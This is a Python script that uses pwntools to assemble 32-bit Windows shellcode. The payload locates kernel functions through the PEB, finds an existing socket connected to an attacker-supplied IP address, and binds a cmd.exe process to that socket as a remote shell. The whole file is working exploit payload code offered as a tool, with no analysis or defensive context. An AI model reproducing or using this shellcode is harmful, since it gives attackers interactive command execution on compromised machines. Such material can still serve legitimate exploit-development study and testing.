#!/usr/bin/env python3
from pwn import *
import re
import argparse
from math import ceil
parser = argparse.ArgumentParser(description='Generate x86 windows shell with socket reuse shellcode')
parser.add_argument('-i', '--ip', type=str, required=True, help='IP address of client')
parser.add_argument('-o', '--output', type=argparse.FileType('wb'), required=False, help='Output shellcode file')

args = parser.parse_args()
ip = args.ip
ip = '0x'+''.join([hex(int(b))[2:] for b in ip.split('.')][::-1])

code = f'''
push ebp
mov ebp, esp
sub esp, 0x60

mov eax, [fs:0x30]; PEB
mov eax, [eax+0xc]; LDR
mov eax, [eax+0x14] ;InMemoryOrderList
mov eax, [eax]
mov eax, [eax]
mov eax, [eax+0x10]; kernel32.dll base address
mov [ebp-4], eax; var4 = kernel32 base addr
mov eax, [eax+0x3c]
add eax, [ebp-4]; e_lfanew
mov eax, [eax+0x78]
add eax, [ebp-4]; data dir
mov [ebp-8], eax; var8 = data dir
mov eax, [eax+0x20]
add eax, [ebp-4]
mov [ebp-12], eax; var12 = name table
mov eax, [ebp-8]
mov eax, [eax+0x24]
add eax, [ebp-4]
mov [ebp-16], eax; var16 = ordinal table
mov eax, [ebp-8]
mov eax, [eax+0x1c]
add eax, [ebp-4]
mov [ebp-8], eax; var8 = addr table

/* push GetProcAddress*/
push 0x1010101
xor dword ptr [esp], 0x1017272
push 0x65726464
push 0x41636f72
push 0x50746547

mov [ebp-20], esp; var20 = GetProcAddress

xor eax, eax
xor ecx, ecx
xor ebx, ebx
.lp1:
    mov edi, [ebp-20]
    mov esi, [ebp-12]
    mov esi, [esi+4*ebx]
    add esi, [ebp-4]
        .lp2:
            lodsb
            test eax, eax
            jz .found
            scasb
            je .eq
            inc ebx
            jmp .lp1
            .eq:
            jmp .lp2


.found:
mov eax, ebx
mov [ebp-20], eax; ordinal
add esp, 16
mov eax, [ebp-16]
xor ecx, ecx
mov cx, [eax+2*ebx]
mov eax, [ebp-8]
mov eax, [eax+4*ecx]
add eax, [ebp-4]
mov [ebp-8], eax; var8 = GetProcAddr

;/* push b'LoadLibraryA\x00' */
push 1
dec byte ptr [esp]
push 0x41797261
push 0x7262694c
push 0x64616f4c

push esp
mov eax, [ebp-4]
push eax
mov eax,[ebp-8]
call eax
mov [ebp-12], eax; var12 = LoadLibraryA
add esp, 16

    /* push 'Ws2_32.dll\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016d6d
    push 0x642e3233
    push 0x5f327357

push esp
mov eax, [ebp-12]
call eax
mov [ebp-16], eax; var16=Ws2.dll
add esp, 12

    /* push 'getpeername\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1646c60
    push 0x6e726565
    push 0x70746567
push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-20], eax; var20 = getpeername
add esp, 12

xor eax, eax
push eax
push eax
push eax
push eax
mov [ebp-24], esp; var24=name
push eax
mov [ebp-28], esp; var28=namelen
movw [esp], 16

mov eax, 80
mov [ebp-32], eax; var32 = fd

.sockloop:
    mov eax, [ebp-28]
    push eax
    mov eax, [ebp-24]
    push eax
    mov eax, [ebp-32]
    push eax
    mov eax, [ebp-20]
    call eax
    test eax, eax
    jz .found_socket
    .next_sock:
    mov eax, [ebp-32]
    inc eax
    mov [ebp-32], eax
    jmp .sockloop

.found_socket:
    ; compare addr with client addr
    mov eax, [ebp-24]
    mov eax, [eax+4]
    cmp eax, {ip}
    jne .next_sock

mov eax, [ebp-32]
add esp, 20

; got socket

; FUCKING PAIN

xor eax, eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov [ebp-20], esp; var20 = si
push eax
push eax
push eax
push eax
mov [ebp-24], esp; var24 = pi
push eax
push eax
push eax
mov [ebp-28], esp; var28 = sa


push eax
mov [ebp-36], esp; var36 = in_read
push eax
mov [ebp-40], esp; var40 = in_write
push eax
mov [ebp-44], esp; var44 = out_read
push eax
mov [ebp-48], esp; var48 = out_write

; setting up named pipes
; sa config
mov eax, [ebp-28]
movw [eax], 12
movw [eax+8], 1

    /* push 'CreatePipe\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016471
    push 0x69506574
    push 0x61657243

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-52], eax; var52 = CreatePipe
add esp, 12

; in pipe
xor eax, eax
push eax
mov eax, [ebp-28]
push eax
mov eax, [ebp-40]
push eax
mov eax, [ebp-36]
push eax
mov eax, [ebp-52]
call eax

; out pipe
xor eax, eax
push eax
mov eax, [ebp-28]
push eax
mov eax, [ebp-48]
push eax
mov eax, [ebp-44]
push eax
mov eax, [ebp-52]
call eax

; setup si
mov eax, [ebp-20]
movw [eax], 0x44
movw [eax+11*4], 0x00000100
mov ebx, [ebp-36]
mov ebx, [ebx]
mov [eax+14*4], ebx
mov ebx, [ebp-48]
mov ebx, [ebx]
mov [eax+15*4], ebx
mov [eax+16*4], ebx

    /* push 'CreateProcessA\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1014072
    push 0x7365636f
    push 0x72506574
    push 0x61657243

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-56], eax; var56 = CreateProcessA
add esp, 16

    /* push 'cmd.exe\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1647964
    push 0x2e646d63

mov [ebp-60], esp; var60 = cmd.exe



mov eax, [ebp-24]
push eax
mov eax, [ebp-20]
push eax
xor eax, eax
push eax
push eax
push eax
inc eax
push eax
xor eax, eax
push eax
push eax
mov eax, [ebp-60]
push eax
xor eax, eax
push eax
mov eax, [ebp-56]
call eax

    /* push 'CloseHandle\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1646d65
    push 0x6e614865
    push 0x736f6c43

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-64], eax; var64 = CloseHandle
add esp, 12

;   CloseHandle(in_read);
mov eax, [ebp-36]
mov eax, [eax]
push eax
mov eax, [ebp-64]
call eax

;    CloseHandle(out_write);
mov eax, [ebp-48]
mov eax, [eax]
push eax
mov eax, [ebp-64]
call eax

    /* push 'ReadFile\x00' */
    push 1
    dec byte ptr [esp]
    push 0x656c6946
    push 0x64616552

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-68], eax; var68 = ReadFile
add esp, 12

    /* push 'WriteFile\x00' */
    push 0x65
    push 0x6c694665
    push 0x74697257

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-72], eax; var72 = WriteFile
add esp, 12

    /* push 'send\x00' */
    push 1
    dec byte ptr [esp]
    push 0x646e6573

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-76], eax; var76 = send
add esp, 8


    /* push 'recv\x00' */
    push 1
    dec byte ptr [esp]
    push 0x76636572
push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-80], eax; var80 = recv
add esp, 8


sub esp, 2048
mov [ebp-64], esp; var64 = buf
xor eax, eax
push eax
mov [ebp-36], esp; var36 = int
.cmd_loop:
xor ecx, ecx
xor eax, eax
mov edi, [ebp-64]
; clear buffer
.clear_loop:
stosd
add ecx, 4
cmp ecx, 2048
jl .clear_loop

; Read cmd output
xor eax, eax
push eax
mov eax, [ebp-36]
push eax
pushd 2048
mov eax, [ebp-64]
push eax
mov eax, [ebp-44]
mov eax, [eax]
push eax
mov eax, [ebp-68]

call eax

; Write to socket
xor eax, eax
push eax
pushd 2048
mov eax, [ebp-64]
push eax
mov eax, [ebp-32]
push eax
mov eax, [ebp-76]
call eax

; clear buffer again

xor ecx, ecx
xor eax, eax
mov edi, [ebp-64]

.clear_loop2:
stosd
add ecx, 4
cmp ecx, 2048
jl .clear_loop2

; Read from socket

xor eax, eax
push eax
pushd 2048
mov eax, [ebp-64]
push eax
mov eax, [ebp-32]
push eax
mov eax, [ebp-80]
call eax


; Write to pipe
xor eax, eax
push eax
mov eax, [ebp-36]
push eax
pushd 2048
mov eax, [ebp-64]
push eax
mov eax, [ebp-40]
mov eax, [eax]
push eax
mov eax, [ebp-72]
call eax

jmp .cmd_loop





add esp, 0x70
add esp, 0x60

pop ebp
ret
'''
code = re.sub(';.*\n', '\n', code)

context.update(arch='i686', bits=32)
sc = asm(code)
if args.output == None:
	print(sc)
else:
	args.output.write(sc)